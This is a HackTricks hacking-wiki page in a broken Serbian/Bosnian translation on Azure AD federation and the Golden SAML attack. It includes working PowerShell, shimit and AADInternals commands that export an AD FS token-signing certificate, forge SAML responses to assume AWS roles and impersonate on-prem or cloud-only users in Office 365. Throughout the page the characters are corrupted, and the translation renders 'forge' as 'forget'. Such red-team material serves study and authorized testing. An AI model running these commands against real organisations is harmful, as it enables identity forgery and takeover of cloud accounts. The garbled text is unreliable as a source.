# Az - Federacija

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 游눫 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 游냕 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Osnovne informacije

[Iz dokumenata:](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/whatis-fed)**Federacija** je skup **domena** koje su uspostavile **povjerenje**. Nivo povjerenja mo쬰 varirati, ali obi캜no uklju캜uje **autentifikaciju** i gotovo uvek uklju캜uje **autorizaciju**. Tipi캜na federacija mo쬰 uklju캜ivati **broj organizacija** koje su uspostavile **povjerenje** za **deljenje pristupa** skupu resursa.

Mo쬰te **federisati svoje on-premises** okru쬰nje **sa Azure AD** i koristiti ovu federaciju za autentifikaciju i autorizaciju. Ova metoda prijavljivanja osigurava da se sva **autentifikacija korisnika vr코i on-premises**. Ova metoda omogu캖ava administratorima da implementiraju rigoroznije nivoe kontrole pristupa. Federacija sa **AD FS** i PingFederate je dostupna.

<figure><img src="../../../../.gitbook/assets/image (154).png" alt=""><figcaption></figcaption></figure>

U su코tini, u Federaciji, sva **autentifikacija** se vr코i u **on-prem** okru쬰nju i korisnik do쬴vljava SSO kroz sva poverena okru쬰nja. Stoga, korisnici mogu **pristupiti** **cloud** aplikacijama koriste캖i svoje **on-prem kredencijale**.

**Security Assertion Markup Language (SAML)** se koristi za **razmenu** svih informacija o autentifikaciji i autorizaciji izme캠u provajdera.

U bilo kojoj federacijskoj postavci postoje tri strane:

* Korisnik ili Klijent
* Provajder identiteta (IdP)
* Provajder usluga (SP)

(Images from https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps)

<figure><img src="../../../../.gitbook/assets/image (121).png" alt=""><figcaption></figcaption></figure>

1. Prvo, aplikaciju (Provajder usluga ili SP, kao 코to je AWS konzola ili vSphere web klijent) pristupa korisnik. Ovaj korak mo쬰 biti zaobi캠en, vode캖i klijenta direktno do IdP (Provajder identiteta) u zavisnosti od specifi캜ne implementacije.
2. Zatim, SP identifikuje odgovaraju캖i IdP (npr. AD FS, Okta) za autentifikaciju korisnika. Zatim kreira SAML (Security Assertion Markup Language) AuthnRequest i preusmerava klijenta na odabrani IdP.
3. IdP preuzima, autentifikuju캖i korisnika. Nakon autentifikacije, SAMLResponse se formira od strane IdP i prosle캠uje SP-u kroz korisnika.
4. Na kraju, SP procenjuje SAMLResponse. Ako je uspe코no validiran, 코to implicira odnos poverenja sa IdP, korisniku se odobrava pristup. Ovo ozna캜ava zavr코etak procesa prijavljivanja, omogu캖avaju캖i korisniku da koristi uslugu.

**Ako 쬰lite da saznate vi코e o SAML autentifikaciji i uobi캜ajenim napadima, idite na:**

{% embed url="https://book.hacktricks.xyz/pentesting-web/saml-attacks" %}

## Pivotiranje

* AD FS je model identiteta zasnovan na tvrdnjama.
* "..tvrdnje su jednostavno izjave (na primer, ime, identitet, grupa), koje se daju o korisnicima, a koriste se prvenstveno za autorizaciju pristupa aplikacijama zasnovanim na tvrdnjama sme코tenim bilo gde na Internetu."
* Tvrdnje za korisnika se pi코u unutar SAML tokena i zatim se potpisuju kako bi se obezbedila poverljivost od strane IdP.
* Korisnik se identifikuje pomo캖u ImmutableID. On je globalno jedinstven i 캜uva se u Azure AD.
* ImmutableID se 캜uva on-prem kao ms-DS-ConsistencyGuid za korisnika i/ili se mo쬰 izvesti iz GUID-a korisnika.
* Vi코e informacija na [https://learn.microsoft.com/en-us/windows-server/identity/ad-fs/technical-reference/the-role-of-claims](https://learn.microsoft.com/en-us/windows-server/identity/ad-fs/technical-reference/the-role-of-claims)

**Golden SAML napad:**

* U ADFS-u, SAML Response se potpisuje sertifikatom za potpisivanje tokena.
* Ako je sertifikat kompromitovan, mogu캖e je autentifikovati se na Azure AD kao BILO KOJI korisnik sinhronizovan sa Azure AD!
* Ba코 kao i kod na코e zloupotrebe PTA, promena lozinke za korisnika ili MFA ne캖e imati nikakav efekat jer falsifikujemo odgovor na autentifikaciju.
* Sertifikat se mo쬰 izvu캖i sa AD FS servera sa DA privilegijama i zatim se mo쬰 koristiti sa bilo kog ra캜unara povezanog na internet.
* Vi코e informacija na [https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps](https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps)

### Golden SAML

Proces u kojem **Provajder identiteta (IdP)** proizvodi **SAMLResponse** za autorizaciju prijavljivanja korisnika je od su코tinskog zna캜aja. U zavisnosti od specifi캜ne implementacije IdP-a, **odgovor** mo쬰 biti **potpisan** ili **kriptovan** koriste캖i **privatni klju캜 IdP-a**. Ova procedura omogu캖ava **Provajderu usluga (SP)** da potvrdi autenti캜nost SAMLResponse-a, osiguravaju캖i da je zaista izdat od strane poverenog IdP-a.

Mo쬰 se povu캖i paralela sa [napadom zlatne karte](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/golden-ticket), gde se klju캜 koji autentifikuje identitet i dozvole korisnika (KRBTGT za zlatne karte, privatni klju캜 za potpisivanje tokena za zlatne SAML) mo쬰 manipulisati da **falsifikuje objekat autentifikacije** (TGT ili SAMLResponse). Ovo omogu캖ava impersonaciju bilo kog korisnika, daju캖i neovla코캖en pristup SP-u.

Zlatni SAML-ovi nude odre캠ene prednosti:

* Mogu se **kreirati na daljinu**, bez potrebe da budu deo domena ili federacije u pitanju.
* Ostaju efikasni 캜ak i sa **dvofaktorskom autentifikacijom (2FA)** uklju캜enom.
* Privatni klju캜 za potpisivanje **tokena se automatski ne obnavlja**.
* **Promena lozinke korisnika ne poni코tava** ve캖 generisani SAML.

#### AWS + AD FS + Zlatni SAML

[Active Directory Federation Services (AD FS)](https://docs.microsoft.com/en-us/previous-versions/windows/server-2008/bb897402\(v=msdn.10\)) je Microsoftova usluga koja olak코ava **sigurnu razmenu informacija o identitetu** izme캠u poverenih poslovnih partnera (federacija). U su코tini, omogu캖ava usluzi domena da deli identitete korisnika sa drugim provajderima usluga unutar federacije.

Sa AWS-om koji veruje kompromitovanom domenu (u federaciji), ova ranjivost se mo쬰 iskoristiti da potencijalno **dobije bilo koje dozvole u AWS okru쬰nju**. Napad zahteva **privatni klju캜 koji se koristi za potpisivanje SAML objekata**, sli캜no kao 코to je potrebno KRBTGT u napadu zlatne karte. Pristup AD FS korisni캜kom nalogu je dovoljan da se dobije ovaj privatni klju캜.

Zahtevi za izvr코enje napada zlatnog SAML-a uklju캜uju:

* **Privatni klju캜 za potpisivanje tokena**
* **IdP javni sertifikat**
* **Ime IdP-a**
* **Ime uloge (uloga koja se preuzima)**
* Domen\korisni캜ko ime
* Ime sesije uloge u AWS-u
* Amazon ID ra캜una

_Samo stavke u podebljanom su obavezne. Ostale se mogu popuniti po 쬰lji._

Da biste dobili **privatni klju캜**, potreban je pristup **AD FS korisni캜kom nalogu**. Odatle, privatni klju캜 se mo쬰 **izvesti iz li캜ne biblioteke** koriste캖i alate kao 코to je [mimikatz](https://github.com/gentilkiwi/mimikatz). Da biste prikupili druge potrebne informacije, mo쬰te koristiti Microsoft.Adfs.Powershell snapin na slede캖i na캜in, osiguravaju캖i da ste prijavljeni kao ADFS korisnik:
```powershell
# From an "AD FS" session
# After having exported the key with mimikatz

# ADFS Public Certificate
[System.Convert]::ToBase64String($cer.rawdata)

# IdP Name
(Get-ADFSProperties).Identifier.AbsoluteUri

# Role Name
(Get-ADFSRelyingPartyTrust).IssuanceTransformRule
```
Sa svim informacijama, mogu캖e je zaboraviti validan SAMLResponse kao korisnik koga 쬰lite da imitirate koriste캖i [**shimit**](https://github.com/cyberark/shimit)**:**

{% code overflow="wrap" %}
```bash
# Apply session for AWS cli
python .\shimit.py -idp http://adfs.lab.local/adfs/services/trust -pk key_file -c cert_file -u domain\admin -n admin@domain.com -r ADFS-admin -r ADFS-monitor -id 123456789012
# idp - Identity Provider URL e.g. http://server.domain.com/adfs/services/trust
# pk - Private key file full path (pem format)
# c - Certificate file full path (pem format)
# u - User and domain name e.g. domain\username (use \ or quotes in *nix)
# n - Session name in AWS
# r - Desired roles in AWS. Supports Multiple roles, the first one specified will be assumed.
# id - AWS account id e.g. 123456789012

# Save SAMLResponse to file
python .\shimit.py -idp http://adfs.lab.local/adfs/services/trust -pk key_file -c cert_file -u domain\admin -n admin@domain.com -r ADFS-admin -r ADFS-monitor -id 123456789012 -o saml_response.xml
```
{% endcode %}

<figure><img src="../../../../.gitbook/assets/image (128).png" alt=""><figcaption></figcaption></figure>

### On-prem -> cloud
```powershell
# With a domain user you can get the ImmutableID of the target user
[System.Convert]::ToBase64String((Get-ADUser -Identity <username> | select -ExpandProperty ObjectGUID).tobytearray())

# On AD FS server execute as administrator
Get-AdfsProperties | select identifier

# When setting up the AD FS using Azure AD Connect, there is a difference between IssueURI on ADFS server and Azure AD.
# You need to use the one from AzureAD.
# Therefore, check the IssuerURI from Azure AD too (Use MSOL module and need GA privs)
Get-MsolDomainFederationSettings -DomainName deffin.com | select IssuerUri

# Extract the ADFS token signing certificate from the ADFS server using AADInternals
Export-AADIntADFSSigningCertificate

# Impersonate a user to to access cloud apps
Open-AADIntOffice365Portal -ImmutableID v1pOC7Pz8kaT6JWtThJKRQ== -Issuer http://deffin.com/adfs/services/trust -PfxFileName C:\users\adfsadmin\Documents\ADFSSigningCertificate.pfx -Verbose
```
Tako캠e je mogu캖e kreirati ImmutableID za korisnike koji su samo u oblaku i imitirati ih.
```powershell
# Create a realistic ImmutableID and set it for a cloud only user
[System.Convert]::ToBase64String((New-Guid).tobytearray())
Set-AADIntAzureADObject -CloudAnchor "User_19e466c5-d938-1293-5967-c39488bca87e" -SourceAnchor "aodilmsic30fugCUgHxsnK=="

# Extract the ADFS token signing certificate from the ADFS server using AADInternals
Export-AADIntADFSSigningCertificate

# Impersonate the user
Open-AADIntOffice365Portal -ImmutableID "aodilmsic30fugCUgHxsnK==" -Issuer http://deffin.com/adfs/services/trust -PfxFileName C:\users\adfsadmin\Desktop\ADFSSigningCertificate.pfx -Verbose
```
## Reference

* [https://learn.microsoft.com/en-us/azure/active-directory/hybrid/whatis-fed](https://learn.microsoft.com/en-us/azure/active-directory/hybrid/whatis-fed)
* [https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps](https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps)

{% hint style="success" %}
U캜ite i ve쬭ajte AWS Hacking:<img src="../../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
U캜ite i ve쬭ajte GCP Hacking: <img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Podr쬴te HackTricks</summary>

* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **Pridru쬴te se** 游눫 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitteru** 游냕 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite hakerske trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}
